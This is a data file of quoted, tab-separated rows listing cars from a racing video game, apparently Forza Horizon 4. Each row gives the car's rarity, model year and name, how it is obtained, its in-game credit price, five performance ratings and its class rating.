'E	HOR XB1 Hoonigan Ford Fiesta 15 about this car	2015	Hoonigan Gymkhana 8 Ford Fiesta ST RX43	DLC: Fortune Island	500,000 CR	5.9	7.9	10	10	8.5	S1 886',
'L	HOR XB1 Hoonigan Ford Focus 16 about this car	2016	Hoonigan Gymkhana 9 Ford Focus RS RX	Autoshow	500,000 CR	5.9	7.9	10	10	8.5	S1 886',
'L	HOR XB1 Hoonigan Ford Focus 16 WP about this car	2016	Hoonigan Gymkhana 9 Ford Focus RS RX "Welcome Pack"	DLC: Welcome Pack	500,000 CR	6.6	8.1	10	10	8.6	S1 900',
'E	HOR XB1 Hoonigan Ford Escort 91 about this car	1991	Hoonigan Gymkhana 10 Ford Escort Cosworth Group A	DLC: Car Pass	500,000 CR	7.9	7.4	10	10	7.5	S1 880',
'E	HOR XB1 Hoonigan Ford F-150 about this car	1977	Hoonigan Gymkhana 10 Ford F-150  Hoonitruck	DLC: Car Pass	500,000 CR	6.8	8.2	9.2	10	8.7	S2 916',
'E	HOR XB1 Hoonigan Ford Fiesta 17 about this car	2017	Hoonigan Gymkhana 10 Ford Fiesta ST	Hard-to-Find: Festival reward	500,000 CR	5.7	8.2	9.0	10	8.4	S1 828',
'L	HOR XB1 Hoonigan Ford Focus 16 G10 about this car	2016	Hoonigan Gymkhana 10 Ford Focus RS RX	HL: Skill Streak - Tier 10	500,000 CR	5.9	7.9	10	10	8.5	S1 886',
'L	HOR XB1 Hoonigan Ford Mustang 65 G10 about this car	1965	Hoonigan Gymkhana 10 Ford Hoonicorn Mustang	Hard-to-Find: Festival reward	500,000 CR	9.0	8.2	10	10	8.5	S2 985',
'E	HOR XB1 Hoonigan Mazda RX-7 about this car	1992	Hoonigan Mazda RX-7 Twerkstallion	Autoshow	50,000 CR	8.6	7.3	6.3	8.0	7.3	S1 838',
'E	HOR XB1 Hoonigan Porsche 911 about this car	1991	Hoonigan Rauh-Welt Begriff Porsche 911 Turbo	HL: Street Scene - Tier 17	160,000 CR	7.3	8.6	8.2	9.5	8.5	S1 850',
'L	HOR XB1 HW 2JetZ about this car	2018	Hot Wheels 2JetZ	DLC: Hot Wheels Legends Car Pack	100,000 CR	7.2	8.0	8.3	9.7	8.3	S1 889',
'L	HOR XB1 HW Bone FH4 about this car	2011	Hot Wheels Bone Shaker	Hard-to-Find: Festival reward	150,000 CR	6.7	7.0	6.9	8.5	7.4	A 795',
'L	HOR XB1 HW Chevy LUV about this car	1972	Hot Wheels Chevrolet LUV	DLC: Hot Wheels Legends Car Pack	100,000 CR	6.1	5.2	7.0	8.2	5.4	B 663',
'L	HOR XB1 HW Ford F-5 about this car	1949	Hot Wheels Ford F-5 Dually Custom Hot Rod	DLC: Hot Wheels Legends Car Pack	100,000 CR	5.6	6.5	7.0	8.7	5.7	B 634',
'E	HOR XB1 HW Ford Mustang FH4 about this car	2005	Hot Wheels Ford Mustang	Hard-to-Find: Festival reward	300,000 CR	7.1	9.2	7.3	8.8	9.7	S1 841',
'L	HOR XB1 HW International-Harvester Loadstar about this car	1969	Hot Wheels International-Harvester Loadstar CO-1600	DLC: Hot Wheels Legends Car Pack	100,000 CR	5.2	5.2	6.0	7.0	6.1	C 563',
'L	HOR XB1 HW Nash Metropolitan about this car	1957	Hot Wheels Nash Metropolitan Custom	DLC: Hot Wheels Legends Car Pack	100,000 CR	6.4	4.7	5.2	6.6	4.5	C 559',
'E	HOR XB1 HW Rip FH4 about this car	2017	Hot Wheels Rip Rod	Star Card:  PR Stunt	300,000 CR	6.2	6.4	7.3	8.8	6.3	A 747',
'L	HOR XB1 HW Studebaker Golden about this car	1957	Hot Wheels Studebaker Golden Hawk  Dream Roadster	DLC: Hot Wheels Legends Car Pack	100,000 CR	6.2	5.3	6.3	7.6	5.9	A 701',
'L	HOR XB1 HW Twin FH4 about this car	1969	Hot Wheels Twin Mill	Hard-to-Find: Festival reward	110,000 CR	8.8	6.6	6.2	7.9	7.1	S1 821',
'R	HOR XB1 HSV GEN-F about this car	2014	HSV GEN-F GTS	Autoshow	75,000 CR	7.6	6.1	6.2	7.8	6.4	A 747',
'R	HOR XB1 HSV GTS about this car	2011	HSV GTS	Hard-to-Find: Festival reward	250,000 CR	7.2	6.1	6.2	7.6	6.1	A 713',
'R	HOR XB1 HSV GTSR FH4 about this car	1996	HSV GTSR	Hard-to-Find: Festival reward	250,000 CR	6.7	6.1	5.9	7.5	5.3	B 669',
'R	HOR XB1 HSV Limited about this car	2014	HSV Limited Edition Gen-F GTS Maloo	Autoshow	62,000 CR	7.1	6.4	6.2	7.8	6.9	A 764',
'R	HOR XB1 Hudson Hornet about this car	1952	Hudson Hornet	Hard-to-Find: Festival reward	66,000 CR	5.0	4.2	4.8	6.5	4.3	D 305',
'R	HOR XB1 Hummer H1 about this car	2006	Hummer H1 Alpha	Wheelspin reward	112,000 CR	5.2	5.4	4.0	6.2	4.9	D 391',
'R	HOR XB1 Hummer H1 06 Open about this car	2006	Hummer H1 Alpha Open Top	Hard-to-Find: Festival reward	250,000 CR	5.1	5.4	4.1	6.5	5.0	D 382',
'C	HOR XB1 Hyundai Veloster 19 about this car	2019	Hyundai Veloster N	Autoshow	30,000 CR	6.7	5.8	6.0	7.6	5.8	B 657',
'R	HOR XB1 Infiniti Q50 about this car	2014	Infiniti Q50 Eau Rouge	Autoshow	100,000 CR	8.1	6.4	9.2	10	6.8	A 783',
'R	HOR XB1 Infiniti Q60 about this car	2015	Infiniti Q60 Concept	Autoshow	50,000 CR	7.4	6.3	6.1	7.7	6.6	A 757',
'C	HOR XB1 International Scout about this car	1970	International Scout 800A	Autoshow	40,000 CR	5.1	4.1	4.6	7.6	3.8	D 334',
'E	HOR XB1 Italdesign Zerouno about this car	2018	Italdesign Zerouno	Hard-to-Find: Festival reward	250,000 CR	8.0	8.7	10	10	9.3	S1 893',
'L	HOR XB1 Jaguar C-Type about this car	1953	Jaguar C-Type	DLC: Car Pass	5,000,000 CR	6.4	4.1	5.2	6.6	4.0	D 495',
'L	HOR XB1 Jaguar D-Type about this car	1956	Jaguar D-Type	Autoshow	10,000,000 CR	6.4	4.2	5.1	6.4	3.6	C 513',
'L	HOR XB1 Jaguar E-type about this car	1961	Jaguar E-type S1	Barn Find	150,000 CR	6.0	5.0	5.7	7.0	4.7	C 539',
'C	HOR XB1 Jaguar F-PACE about this car	2017	Jaguar F-PACE S	Autoshow	55,000 CR	6.6	5.9	7.0	8.7	6.0	B 698',
'E	HOR XB1 Jaguar F-TYPE 16 about this car	2016	Jaguar F-TYPE Project 7	Autoshow	190,000 CR	7.5	7.0	6.4	8.0	7.4	S1 805',
'E	HOR XB1 Jaguar F-TYPE 15 about this car	2015	Jaguar F-TYPE R Coupé	Autoshow	110,000 CR	7.9	6.5	6.4	8.1	6.9	A 795',
'E	HOR XB1 Jaguar I-Pace about this car	2018	Jaguar I-Pace	Hard-to-Find: Festival reward	250,000 CR	5.5	5.9	6.2	7.8	5.9	A 706',
'L	HOR XB1 Jaguar Lightweight about this car	1964	Jaguar Lightweight E-Type	Autoshow	10,000,000 CR	6.9	5.5	6.0	7.7	5.5	A 707',
'C	HOR XB1 Jaguar Mk about this car	1959	Jaguar Mk II 3.8	Autoshow	80,000 CR	5.5	4.5	5.1	6.5	4.8	D 414',
'C	HOR XB1 Jaguar XE-S about this car	2015	Jaguar XE-S	Autoshow	57,000 CR	7.3	5.5	6.0	7.7	5.3	B 660',
'L	HOR XB1 Jaguar XJ220 about this car	1993	Jaguar XJ220	Barn Find	350,000 CR	8.3	6.8	6.8	7.6	7.1	S1 811',
'R	HOR XB1 Jaguar XFR-S about this car	2015	Jaguar XFR-S	Autoshow	110,000 CR	8.0	6.2	6.3	7.9	6.5	A 755',
'C	HOR XB1 Jaguar XJ-S about this car	1990	Jaguar XJ-S	Autoshow	25,000 CR	6.8	4.7	4.8	5.7	4.8	C 557',
'R	HOR XB1 Jaguar XK120 about this car	1954	Jaguar XK120 SE	Autoshow	120,000 CR	5.8	4.5	5.7	7.1	4.4	D 469',
'E	HOR XB1 Jaguar XKR-S 12 about this car	2012	Jaguar XKR-S	Autoshow	100,000 CR	7.9	6.5	6.2	7.8	6.7	A 782',
'E	HOR XB1 Jaguar XKR-S 15 about this car	2015	Jaguar XKR-S GT	HL: Road Racing - Tier 16	190,000 CR	7.7	6.9	6.4	8.1	7.5	A 798',
'C	HOR XB1 JBE AMC Hornet about this car	1974	James Bond Edition AMC Hornet X Hatchback	DLC: Best of Bond Car Pack	35,000 CR	5.7	4.3	5.1	6.4	4.2	D 414',
'L	HOR XB1 JBE AM DB5 about this car	1964	James Bond Edition Aston Martin DB5	DLC: Best of Bond Car Pack	650,000 CR	6.3	5.0	5.7	7.2	4.7	B 618',
'L	HOR XB1 JBE AM DB10 about this car	2015	James Bond Edition Aston Martin DB10	DLC: Best of Bond Car Pack	220,000 CR	7.7	7.4	6.9	8.5	8.0	S1 814',
'R	HOR XB1 JBE AM DBS 69 about this car	1969	James Bond Edition Aston Martin DBS	DLC: Best of Bond Car Pack	650,000 CR	7.0	5.0	5.8	7.4	5.0	B 612',
'E	HOR XB1 JBE AM DBS 08 about this car	2008	James Bond Edition Aston Martin DBS	DLC: Best of Bond Car Pack	325,000 CR	7.7	6.9	6.5	8.2	7.4	A 779',
'E	HOR XB1 JBE AM V8 about this car	1986	James Bond Edition Aston Martin V8	DLC: Best of Bond Car Pack	200,000 CR	6.9	5.3	5.7	6.8	4.9	B 620',
'R	HOR XB1 JBE BMW Z8 about this car	1999	James Bond Edition BMW Z8	DLC: Best of Bond Car Pack	150,000 CR	6.9	6.3	6.3	8.0	5.7	A 720',
'C	HOR XB1 JBE Citroen 2CV6 about this car	1981	James Bond Edition Citroën 2CV6	DLC: Best of Bond Car Pack	80,000 CR	4.1	3.9	4.1	4.8	3.8	D 100',
'L	HOR XB1 JBE Jaguar C-X75 about this car	2010	James Bond Edition Jaguar C-X75	DLC: Best of Bond Car Pack	1,500,000 CR	8.3	7.9	9.8	10	8.5	S1 900',
'L	HOR XB1 JBE Lotus Esprit about this car	1977	James Bond Edition Lotus Esprit S1	DLC: Best of Bond Car Pack	550,000 CR	5.7	5.6	5.6	6.8	5.1	C 541',
'C	HOR XB1 Jeep CJ5 about this car	1976	Jeep CJ5 Renegade	Autoshow	60,000 CR	4.8	4.7	6.0	8.9	4.6	D 417',
'L	HOR XB1 Jeep CJ5 WP about this car	1976	Jeep CJ5 Renegade "Welcome Pack"	DLC: Welcome Pack	60,000 CR	5.6	6.1	7.7	9.0	5.6	B 700',
'L	Missing Car about this car	2020	Jeep Gladiator Rubicon	Hard-to-Find: Festival reward	250,000 CR	5.6	4.9	5.3	7.0	4.7	D 489',
'C	HOR XB1 Jeep Grand 14 about this car	2014	Jeep Grand Cherokee SRT	Wheelspin reward	80,000 CR	6.7	6.0	7.5	9.3	6.1	A 711',
'R	HOR XB1 Jeep Grand 18 about this car	2018	Jeep Grand Cherokee Trackhawk	HL: Cross Country - Tier 8	73,000 CR	7.4	6.2	9.3	10	6.7	A 780',
'E	HOR XB1 Jeep Trailcat about this car	2016	Jeep Trailcat	HL: Cross Country - Tier 3	75,000 CR	6.8	6.5	7.0	8.1	5.6	A 790',
'E	HOR XB1 Jeep Wrangler 13 about this car	2013	Jeep Wrangler Unlimited DeBerti Design	Hard-to-Find: Festival reward	250,000 CR	5.6	6.6	7.7	8.7	6.5	A 796',
'C	HOR XB1 Jeep Wrangler 12 about this car	2012	Jeep Wrangler Rubicon	Autoshow	50,000 CR	5.6	4.8	5.7	7.3	4.3	D 488',
'C	HOR XB1 Kia Stinger about this car	2018	Kia Stinger	Autoshow	46,000 CR	7.3	6.0	6.2	7.8	5.9	A 715',
'L	HOR XB1 Koenigsegg Agera about this car	2011	Koenigsegg Agera	Autoshow	1,500,000 CR	9.6	8.5	7.3	8.9	8.9	S2 920',
'L	HOR XB1 Koenigsegg Agera 17 about this car	2017	Koenigsegg Agera RS	DLC: Car Pass	2,000,000 CR	10	9.5	7.5	9.0	10	S2 996',
'L	HOR XB1 Koenigsegg CC8S about this car	2002	Koenigsegg CC8S	DLC: Fortune Island  Treasure Chest #5	320,000 CR	9.0	8.4	7.3	8.3	8.5	S1 883',
'L	HOR XB1 Koenigsegg CCGT about this car	2008	Koenigsegg CCGT	Hard-to-Find: Festival reward	250,000 CR	7.8	10	7.9	9.3	10	S2 986',
'L	HOR XB1 Koenigsegg CCX about this car	2006	Koenigsegg CCX	Hard-to-Find: Festival reward	250,000 CR	9.0	7.9	7.3	8.8	8.3	S1 881',
'L	HOR XB1 Koenigsegg Jesko about this car	2020	Koenigsegg Jesko	Hard-to-Find: Festival reward	2,800,000 CR	10	9.7	8.3	9.6	10	S2 998',
'L	HOR XB1 Koenigsegg One-1 about this car	2015	Koenigsegg One:1	Autoshow	2,850,000 CR	10	9.8	7.5	9.0	10	S2 993',
'L	HOR XB1 Koenigsegg Regera about this car	2016	Koenigsegg Regera	Autoshow	1,900,000 CR	9.2	9.1	7.3	8.9	9.7	S2 972',
'E	HOR XB1 KTM X-Bow 18 about this car	2018	KTM X-Bow GT4	Hard-to-Find: Festival reward	400,000 CR	6.3	10	6.7	7.9	10	S1 861',
'E	HOR XB1 KTM X-Bow 13 about this car	2013	KTM X-Bow R	Autoshow	105,000 CR	6.0	9.1	7.5	9.1	9.8	S1 819',
'E	HOR XB1 Lambo Aventador 12 J about this car	2012	Lamborghini Aventador J	DLC: Fortune Island  Treasure Chest #10	2,700,000 CR	8.3	7.9	9.4	10	8.3	S1 871',
'E	HOR XB1 Lambo Aventador 12 about this car	2012	Lamborghini Aventador LP700-4	Autoshow	310,000 CR	8.7	7.8	9.8	10	8.3	S1 882',
'L	HOR XB1 Lambo Aventador 12 about this car	2012	Lamborghini Aventador LP700-4 "Welcome Pack"	DLC: Welcome Pack	310,000 CR	8.7	8.4	9.8	10	8.8	S1 900',
'F	HOR XB1 Lambo Aventador 12 FE about this car	2012	Lamborghini Aventador LP700-4 F.E.	Wheelspin reward	560,000 CR	9.0	8.5	10	10	8.4	S2 997',
'E	HOR XB1 Lambo Aventador 16 about this car	2016	Lamborghini Aventador Superveloce	Wheelspin reward	480,000 CR	8.7	8.7	10	10	9.1	S2 906',
'L	HOR XB1 Lambo Centenario about this car	2016	Lamborghini Centenario LP 770-4	Autoshow	2,300,000 CR	8.6	9.4	10	10	9.8	S2 918',
'E	HOR XB1 Lambo Countach about this car	1988	Lamborghini Countach LP5000 QV	Autoshow	220,000 CR	7.4	6.6	6.4	7.5	6.0	A 759',
'E	HOR XB1 Lambo Diablo 97 about this car	1997	Lamborghini Diablo SV	Autoshow	174,000 CR	8.1	6.6	6.8	8.0	6.5	A 787',
'L	HOR XB1 Lambo Diablo 99 about this car	1999	Lamborghini Diablo GTR	Hard-to-Find: Festival reward	250,000 CR	7.8	9.9	8.2	9.1	10	S2 915',
'E	HOR XB1 Lambo Gallardo 12 about this car	2012	Lamborghini Gallardo LP 570-4 Spyder Performante	DLC: Car Pass	280,000 CR	7.5	7.0	7.9	8.1	7.6	S1 814',
'E	HOR XB1 Lambo Gallardo 11 about this car	2011	Lamborghini Gallardo LP 570-4 Superleggera	Autoshow	180,000 CR	7.9	7.2	8.4	9.4	7.5	S1 833',
'E	HOR XB1 Lambo Huracan 14 about this car	2014	Lamborghini Huracán LP 610-4	HL: Road Racing - Tier 4	240,000 CR	8.2	7.8	9.2	10	8.4	S1 866',
'L	HOR XB1 Lambo Huracan 18 about this car	2018	Lamborghini Huracán Performante	Hard-to-Find: Festival reward	275,000 CR	7.8	8.5	10	10	9.1	S1 900',
'R	HOR XB1 Lambo Jarama about this car	1977	Lamborghini Jarama S	DLC: Car Pass	150,000 CR	6.3	4.7	5.5	6.6	4.9	C 559',
'R	HOR XB1 Lambo LM about this car	1986	Lamborghini LM 002	Autoshow	180,000 CR	6.1	5.0	4.7	5.3	4.5	C 553',
'L	HOR XB1 Lambo Miura about this car	1967	Lamborghini Miura P400	Autoshow	1,000,000 CR	6.6	5.2	5.6	6.6	4.8	B 619',
'E	HOR XB1 Lambo Murcielago about this car	2010	Lamborghini Murciélago LP 670-4 SV	Autoshow	500,000 CR	8.2	7.4	6.7	8.0	7.9	S1 840',
'L	HOR XB1 Lambo Reventon about this car	2008	Lamborghini Reventón	Autoshow	1,375,000 CR	8.2	7.4	6.7	8.0	7.9	S1 841',
'F	HOR XB1 Lambo Reventon FE about this car	2008	Lamborghini Reventón F.E.	Skill Tree:  Lamborghini Miura P400	1,625,000 CR	8.2	7.7	6.7	8.0	8.2	S1 847',
'L	HOR XB1 Lambo Sesto about this car	2011	Lamborghini Sesto Elemento	Autoshow	2,500,000 CR	8.1	10	10	10	10	S2 948',
'E	HOR XB1 Lambo Urus 19 about this car	2019	Lamborghini Urus	DLC: Fortune Island  Treasure Chest #2	150,000 CR	7.6	6.7	7.6	9.3	7.4	A 795',
'E	HOR XB1 Lambo Urus 14 about this car	2014	Lamborghini Urus Concept	Autoshow	230,000 CR	7.4	6.5	7.0	8.7	7.1	A 774',
'L	HOR XB1 Lambo Veneno about this car	2013	Lamborghini Veneno	Autoshow	4,500,000 CR	8.5	10	10	10	10	S2 943',
'L	HOR XB1 Lancia 037 about this car	1982	Lancia 037 Stradale	Autoshow	95,000 CR	6.0	5.5	6.1	7.3	5.5	C 590',
'E	HOR XB1 Lancia Delta 92 about this car	1992	Lancia Delta HF Integrale Evo	Wheelspin reward	60,000 CR	5.7	4.7	6.2	8.0	5.0	C 532',
'L	HOR XB1 Lancia Delta 86 about this car	1986	Lancia Delta S4	Autoshow	146,000 CR	5.8	5.4	7.1	8.7	5.6	B 638',
'R	HOR XB1 Lancia Fulvia about this car	1968	Lancia Fulvia Coupé Rallye 1.6 HF	Autoshow	60,000 CR	5.5	4.7	5.5	7.0	4.7	D 490',
'L	HOR XB1 Lancia Stratos about this car	1974	Lancia Stratos HF Stradale	Autoshow	550,000 CR	6.1	4.8	6.1	7.8	4.6	C 544',
'C	HOR XB1 LR Defender about this car	1997	Land Rover Defender 90	Autoshow	30,000 CR	4.8	4.8	4.6	5.5	4.5	D 357',
'C	HOR XB1 LR Range 73 about this car	1973	Land Rover Range Rover	Barn Find	50,000 CR	4.5	4.6	4.3	6.7	4.4	D 235',
'R	HOR XB1 LR Range 15 about this car	2015	Land Rover Range Rover Sport SVR	Autoshow	133,000 CR	7.1	6.2	7.5	9.2	6.4	A 752',
'E	HOR XB1 LR Range 18 about this car	2018	Land Rover Range Rover Velar First Edition	Hard-to-Find: Festival reward	85,000 CR	6.7	5.8	6.1	8.0	5.9	B 658',
'C	HOR XB1 LR Series about this car	1972	Land Rover Series III	Autoshow	20,000 CR	3.9	4.0	3.7	4.7	4.0	D 100',
'F	HOR XB1 LR Series FE about this car	1972	Land Rover Series III F.E.	Wheelspin reward	270,000 CR	6.6	6.3	7.6	8.8	5.6	S1 802',
'L	HOR XB1 LEGO Bugatti Chiron about this car	2019	LEGO Speed Champions Bugatti Chiron	DLC: LEGO Speed Champions	2,400,000 CR	10	8.0	9.4	10	9.0	S2 937',
'L	HOR XB1 LEGO Ferrari F40 about this car	1987	LEGO Speed Champions Ferrari F40 Competizione	DLC: LEGO Speed Champions	3,000,000 CR	8.0	10	8.7	7.1	10	S2 973',
'L	HOR XB1 LEGO McLaren Senna about this car	2019	LEGO Speed Champions McLaren Senna	DLC: LEGO Speed Champions	1,000,000 CR	8.7	10	9.3	10	10	S2 978',
'E	HOR XB1 LEGO MINI Cooper about this car	1967	LEGO Speed Champions Mini Cooper S Rally	DLC: LEGO Speed Champions	500,000 CR	6.4	8.1	8.8	10	8.3	S1 831',
'L	HOR XB1 LEGO Porsche 911 about this car	1974	LEGO Speed Champions Porsche 911 Turbo 3.0	DLC: LEGO Speed Champions  (Barn Find)	500,000 CR	7.6	9.4	8.5	9.8	10	S1 898',
'R	HOR XB1 Lexus IS F FH4 about this car	2009	Lexus IS F	Hard-to-Find: Festival reward	250,000 CR	7.5	6.1	6.1	7.7	6.1	A 737',
'E	HOR XB1 Lexus LFA FH4 about this car	2010	Lexus LFA	Hard-to-Find: Festival reward	500,000 CR	7.8	7.1	6.9	8.5	7.8	S1 826',
'E	HOR XB1 Lexus RC F FH4 about this car	2015	Lexus RC F	Hard-to-Find: Festival reward	250,000 CR	7.2	6.5	6.3	7.9	6.7	A 761',
'E	HOR XB1 LM Rally about this car	2014	Local Motors Rally Fighter	Autoshow	100,000 CR	6.7	6.4	6.1	7.3	5.9	A 760',
'E	HOR XB1 Lola 6 T70 about this car	1969	Lola 6 Penske Sunoco T70 MkIIIB	Autoshow	850,000 CR	7.4	6.8	7.9	9.4	6.6	S1 828',
'E	HOR XB1 Lotus 2-Eleven about this car	2009	Lotus 2-Eleven	Wheelspin reward	130,000 CR	6.2	9.3	7.4	8.9	9.9	S1 813',
'E	HOR XB1 Lotus 3-Eleven about this car	2016	Lotus 3-Eleven	Autoshow	150,000 CR	6.8	9.3	8.0	9.4	9.9	S1 870',
'R	HOR XB1 Lotus 340R about this car	2000	Lotus 340R	Autoshow	40,000 CR	5.6	7.6	7.1	8.5	7.8	A 706',
'C	HOR XB1 Lotus Elan about this car	1971	Lotus Elan Sprint	Autoshow	57,000 CR	5.5	5.0	5.3	6.3	4.7	D 456',
'L	HOR XB1 Lotus Eleven about this car	1956	Lotus Eleven	Autoshow	140,000 CR	5.7	5.7	5.3	6.3	5.2	C 553',
'C	HOR XB1 Lotus Elise 05 about this car	2005	Lotus Elise 111S	Wheelspin reward	45,000 CR	5.7	7.0	6.3	7.8	7.0	B 650',
'L	HOR XB1 Lotus Elise 99 about this car	1999	Lotus Elise Series 1 Sport 190	Hard-to-Find: Festival reward	81,000 CR	6.1	6.9	7.2	8.6	6.8	A 728',
'L	HOR XB1 Lotus Elise 97 about this car	1997	Lotus Elise GT1	Barn Find	1,800,000 CR	6.8	8.6	7.2	8.4	9.0	S1 815',
'R	HOR XB1 Lotus Esprit about this car	2002	Lotus Esprit V8	Autoshow	42,000 CR	7.3	6.6	7.0	8.6	6.5	A 756',
'R	HOR XB1 Lotus Evora about this car	2011	Lotus Evora S	Autoshow	43,000 CR	7.1	6.6	7.2	8.8	6.6	A 748',
'R	HOR XB1 Lotus Exige about this car	2012	Lotus Exige S	Autoshow	85,000 CR	7.0	7.1	7.4	8.9	7.4	A 772',
'L	HOR XB1 Maserati 8CTF about this car	1939	Maserati 8CTF	Autoshow	10,000,000 CR	7.3	5.2	5.4	6.9	4.8	B 648',
'L	HOR XB1 Maserati 300 about this car	1957	Maserati 300 S	Autoshow	6,000,000 CR	6.2	5.3	5.8	7.0	4.7	B 668',
'L	HOR XB1 Maserati A6GCS-53 about this car	1953	Maserati A6GCS/53 Pininfarina Berlinetta	Autoshow	2,000,000 CR	5.5	4.8	4.7	5.1	4.6	D 486',
'R	HOR XB1 Maserati Ghibli about this car	2014	Maserati Ghibli S Q4	Hard-to-Find: Festival reward	250,000 CR	7.3	6.1	7.2	9.0	6.1	A 737',
'R	HOR XB1 Maserati Gran about this car	2010	Maserati Gran Turismo S	Autoshow	156,000 CR	7.4	6.3	6.6	8.3	6.3	A 727',
'C	HOR XB1 Maserati Levante about this car	2017	Maserati Levante S	Hard-to-Find: Festival reward	85,000 CR	7.2	5.9	6.7	8.0	6.2	A 723',
'E	HOR XB1 Maserati MC12 about this car	2004	Maserati MC12	Autoshow	1,000,000 CR	8.4	8.0	7.5	9.1	8.3	S1 861',
'F	HOR XB1 Maserati MC12 FE about this car	2004	Maserati MC12 F.E.	Skill Tree:  Maserati 300 S	1,250,000 CR	8.4	10	8.8	9.9	10	S2 945',
'L	HOR XB1 Maserati MC12 08 about this car	2008	Maserati MC12 Versione Corsa	Hard-to-Find: Festival reward	2,500,000 CR	8.1	10	8.9	10	10	S2 993',
'L	HOR XB1 Maserati Tipo about this car	1961	Maserati Tipo 61 Birdcage	Autoshow	2,400,000 CR	7.0	5.9	6.3	8.0	5.7	A 747',
'C	HOR XB1 Mazda Mazdaspeed 05 about this car	2005	Mazda Mazdaspeed MX-5	Autoshow	25,000 CR	5.9	6.1	5.2	7.8	5.7	B 605',
'C	HOR XB1 Mazda MX-5 13 about this car	2013	Mazda MX-5	Autoshow	26,000 CR	5.7	5.5	5.7	7.4	5.0	C 525',
'C	HOR XB1 Mazda MX-5 16 about this car	2016	Mazda MX-5	Autoshow	35,000 CR	6.2	6.2	6.3	7.9	5.7	B 625',
'C	HOR XB1 Mazda MX-5 94 about this car	1994	Mazda MX-5 Miata	Autoshow	25,000 CR	5.5	4.9	5.2	6.4	4.3	D 428',
'C	HOR XB1 Mazda RX-7 97 about this car	1997	Mazda RX-7	Autoshow	35,000 CR	7.2	6.0	6.3	8.0	5.1	B 681',
'C	HOR XB1 Mazda RX-7 85 about this car	1985	Mazda RX-7 GSL-SE	Hard-to-Find: Festival reward	250,000 CR	5.7	4.7	5.2	7.1	4.5	D 427',
'R	HOR XB1 Mazda RX-7 02 about this car	2002	Mazda RX-7 Spirit R Type-A	DLC: Car Pass	30,000 CR	7.1	6.2	6.3	8.0	5.7	A 711',
'R	HOR XB1 Mazda RX-8 about this car	2011	Mazda RX-8 R3	Autoshow	27,000 CR	6.5	6.0	6.1	7.7	5.6	B 638',
'C	HOR XB1 Mazda Savanna about this car	1990	Mazda Savanna RX-7	Autoshow	25,000 CR	6.5	5.3	6.0	7.7	5.3	C 561',
'E	HOR XB1 McLaren 12C FH4 about this car	2011	McLaren 12C Coupé	Hard-to-Find: Festival reward	250,000 CR	8.1	7.5	7.3	8.9	7.8	S1 854',
'E	HOR XB1 McLaren 570S about this car	2015	McLaren 570S Coupé	Autoshow	224,000 CR	7.8	7.5	7.3	8.9	8.0	S1 848',
'E	HOR XB1 McLaren 600LT about this car	2018	McLaren 600LT Coupé	Hard-to-Find: Festival reward	250,000 CR	7.8	8.5	7.7	9.2	9.0	S1 890',
'E	HOR XB1 McLaren 650S 15 about this car	2015	McLaren 650S Coupé	Autoshow	420,000 CR	7.8	7.9	7.5	9.1	8.6	S1 877',
'E	HOR XB1 McLaren 650S 14 about this car	2014	McLaren 650S Spider	DLC: Car Pass	420,000 CR	7.8	7.9	7.5	9.1	8.6	S1 873',
'E	HOR XB1 McLaren 720S 18 about this car	2018	McLaren 720S Coupe	Autoshow	340,000 CR	8.6	8.9	7.9	9.4	9.4	S2 929',
'E	HOR XB1 McLaren 720S 18 PO about this car	2018	McLaren 720S Coupe Preorder Car	Pre-Order bonus	340,000 CR	9.2	10	8.6	9.8	10	S2 998',
'E	HOR XB1 McLaren 720S 19 about this car	2019	McLaren 720S Spider	Hard-to-Find: Festival reward	250,000 CR	7.9	8.7	7.9	9.3	9.4	S2 914',
'L	HOR XB1 McLaren F1 93 about this car	1993	McLaren F1	Autoshow	2,000,000 CR	9.0	6.9	7.3	8.5	7.2	S1 826',
'L	HOR XB1 McLaren F1 97 about this car	1997	McLaren F1 GT	Autoshow	5,200,000 CR	8.7	8.3	7.6	8.9	8.6	S1 888',
'L	HOR XB1 McLaren P1 about this car	2013	McLaren P1	Autoshow	1,350,000 CR	9.3	9.3	7.9	9.3	9.7	S2 962',
'L	HOR XB1 McLaren P1 Owen s about this car	2013	McLaren P1  Owen s Edition 	Unreleased  (Exclusive Gift)	1,200,000 CR	9.3	9.9	8.4	9.6	10	S2 957',
'L	HOR XB1 McLaren Senna about this car	2018	McLaren Senna	Autoshow	1,000,000 CR	8.4	10	8.7	9.9	10	S2 977',
'L	HOR XB1 McLaren Speedtail about this car	2019	McLaren Speedtail	Hard-to-Find: Festival reward	2,250,000 CR	9.7	8.5	7.9	9.3	8.7	S2 940',
'R	HOR XB1 M-B AMG C 63 about this car	2016	Mercedes-AMG C 63 S Coupé	Autoshow	90,000 CR	7.5	6.6	6.4	8.1	7.2	A 777',
'R	HOR XB1 M-B E 63 18 about this car	2018	Mercedes-AMG E 63 S	Hard-to-Find: Festival reward	250,000 CR	8.0	6.5	9.3	10	7.0	S1 805',
'R	HOR XB1 M-B AMG GT 18 about this car	2018	Mercedes-AMG GT 4-Door Coupé	Hard-to-Find: Festival reward	105,000 CR	8.3	6.2	9.1	10.0	6.5	A 797',
'R	HOR XB1 M-B AMG GT 17 about this car	2017	Mercedes-AMG GT R	Autoshow	295,000 CR	7.6	7.9	7.3	8.9	8.6	S1 858',
'E	HOR XB1 M-B AMG GT 17 PO about this car	2017	Mercedes-AMG GT R Preorder Car	Pre-Order bonus  / Gifted	295,000 CR	7.9	8.5	7.8	9.3	9.1	S1 900',
'R	HOR XB1 M-B AMG GT 15 about this car	2015	Mercedes-AMG GT S	Autoshow	157,000 CR	7.6	7.3	7.1	8.7	7.9	S1 820',
'R	HOR XB1 M-B 24 Truck about this car	2015	Mercedes-Benz #24 Tankpool24 Racing Truck	Autoshow	500,000 CR	6.0	6.0	6.9	8.6	6.8	B 682',
'R	HOR XB1 M-B 190E about this car	1990	Mercedes-Benz 190E 2.5-16 Evolution II	Autoshow	150,000 CR	6.6	5.3	5.7	7.2	5.4	C 579',
'R	HOR XB1 M-B 280 about this car	1967	Mercedes-Benz 280 SL	Hard-to-Find: Festival reward	150,000 CR	5.6	4.6	4.8	7.0	4.8	D 448',
'L	HOR XB1 M-B 300 54 about this car	1954	Mercedes-Benz 300 SL Coupé	Autoshow	1,200,000 CR	6.0	4.5	5.4	6.4	4.4	D 476',
'L	HOR XB1 M-B 300 55 about this car	1955	Mercedes-Benz 300 SLR	Autoshow	8,000,000 CR	7.1	5.8	6.1	7.1	4.9	A 708',
'R	HOR XB1 M-B A 45 about this car	2013	Mercedes-Benz A 45 AMG	Autoshow	65,000 CR	7.3	6.1	8.0	9.8	6.4	A 722',
